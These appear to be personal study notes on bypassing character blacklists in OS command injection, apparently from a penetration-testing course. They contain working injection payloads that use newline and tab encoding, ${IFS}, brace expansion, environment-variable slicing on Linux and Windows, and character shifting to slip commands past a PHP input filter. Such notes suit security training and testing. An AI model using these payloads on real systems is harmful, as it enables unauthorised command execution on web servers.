# Identifying Filters
***
### Filter / WAF protection
#### While attempting to inject OS commands using some operator we could see that always returned an error message ("Invalid Input") . Indicating the presence of a security mechanism that denied the request

### Blacklisted Characters
#### Example of PHP blacklist verification
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Identifying Blacklisted Character
#### By executing each request with one character at a time to check which gets blocked.
#### Example
```bash
127.0.0.1;
```


### Bypassing Blacklisted Operators
#### Usually the new-line (%0a) character is usually not blacklisted, as it may be needed in the payload itself. The new-line works in appending our commands.

### Bypassing Blacklisted Spaces
#### A space is commonly blacklisted character, more specifically when the input souldn't contain any spaces.
#### Luckily, there are many ways to add a space character without using it
##### **Using Tabs** (%09)
```http request
ip = 127.0.0.1%0a%09
```

##### **Using $IFS**
##### This Linux Environmental variable may also work, because has a default value of a space and a tab.
```
ip = 127.0.0.1%0a${IFS}
```

##### **Using Brace Expansion**
##### Bash Brace Expansion will automatically add spaces between arguments wrapped between braces
```http request
ip=127.0.0.1%0a{ls,-la}
```


### Bypassing Other Blacklisted Characters
#### Another common blacklisted character is the slash or backlash
#### Linux
##### Using Linux Environment Variables ($PATH)
```bash
$ echo ${PATH}
/usr/local/bin:/usr....
```
#### We can use that same variable to only get the slash character, by specifying the start index and the legth of the string we want to extract
```bash
$ echo ${PATH:0:1}
/
```
#### There are other environment variables, **$HOME** or **PWD** that we can use to get that same result or for other operators
```bash
$ echo ${LS_COLORS:10:1}
;
```
##### **Note**: The **printenv** command prints all environmental variables in Linux

#### Windows
##### We can use the same idea for Windows, by specifying a starting point (```~6 -> \student```) and then specifying a negative end position (```-7 -> \```)
```commandline
> echo %HOMEPATH:~6,-11%
\
```

##### In Windows PowerShell we can achieve the same thing, by specifying the index of the character we need
```commandline
>  $env:HOMEPATH[0]
\
```

##### To print all the environmental variables in PowerShell we can use the **Get-ChildItem ENV** command.

### Character Shifting
#### This ```<<<``` command , in Linux, shifts any character we pass by 1
```bash
$ man ascii
$ echo $(tr '!-}' '"-~'<<<[)
\
```

#### Full example utilising some methods above
```http request
ip=127.0.0.1%09

ls%09..${PWD:0:1}..${PWD:0:1}..${PWD:0:1}home
```

## [PayloadsAllTheThings ](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

